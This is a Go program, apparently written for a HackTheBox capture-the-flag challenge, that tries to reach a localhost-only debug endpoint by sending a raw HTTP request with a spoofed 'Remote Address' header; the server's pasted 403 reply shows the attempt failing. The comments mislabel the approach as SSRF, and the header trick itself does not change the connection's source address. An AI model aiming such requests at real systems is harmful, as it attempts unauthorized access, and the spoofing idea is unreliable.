// exploit for https://app.hackthebox.com/challenges/proxyasaservice

package main

import (
	"flag"
	"fmt"
	"net"
)

func main() {
	// cli flags to point to target host
	host := flag.String("host", "localhost", "Hostname or IP address")
	port := flag.String("port", "8080", "Port number")

	// parse the command-line flags
	flag.Parse()

	// convert the pointers
	serverAddress := fmt.Sprintf("%v", *host)
	serverPort := fmt.Sprintf("%v", *port)

	// exploiting this endpoint that will show the env's information
	// and where the flag is. source: routes.pyL31. This endpoint is
	// protected by a decorator that only accepts connections from
	// 127.0.0.1
	serverEndpoint := "/debug/environment"

	// creating a custom http client since the default Go http won't
	// let me override the Request.RemoteAddr field. the vulnerable
	// app's utils.pyL12 shows a decorator that will only accept connections
	// from localhost. This will allow me to set a custom "Remote Address"
	// header
	conn, err := net.Dial("tcp", fmt.Sprintf(serverAddress+":"+serverPort))
	if err != nil {
		fmt.Println("Error connecting to the server:", err)
		return
	}
	defer conn.Close()

	// define the HTTP request with custom Remote Address header
	// for SSRF
	httpRequest := "GET " + serverEndpoint + " HTTP/1.1\r\n" +
		"Accept: */* \r\n" +
		"Host: " + serverAddress + "\r\n" +
		"User-Agent: CustomTCPClient\r\n" +
		"Remote Address: 127.0.0.1\r\n" +
		"Connection: close\r\n\r\n"

	fmt.Printf("request: %v", httpRequest)

	// send the HTTP request to the server
	_, err = conn.Write([]byte(httpRequest))
	if err != nil {
		fmt.Println("Error sending the request:", err)
		return
	}

	// read the HTTP response from the server
	buffer := make([]byte, 1024)
	for {
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("Error reading the response:", err)
			return
		}
		if n == 0 {
			break
		}
		// rrocess and print the response data
		fmt.Print(string(buffer[:n]))
	}
}

// so far here's what I'm getting back from the server:

// request: GET /debug/environment HTTP/1.1
// Accept: */*
// Host: xxx.xxx.xxx.xxx
// User-Agent: CustomTCPClient
// Remote Address: 127.0.0.1
// Connection: close

// HTTP/1.1 403 FORBIDDEN
// Server: Werkzeug/3.0.0 Python/3.12.0
// Date: Tue, 31 Oct 2023 11:49:56 GMT
// Content-Type: application/json
// Content-Length: 24
// Connection: close

// {"error":"Not Allowed"}
// Error reading the response: EOF

// for some reason it's still triggering the 403.
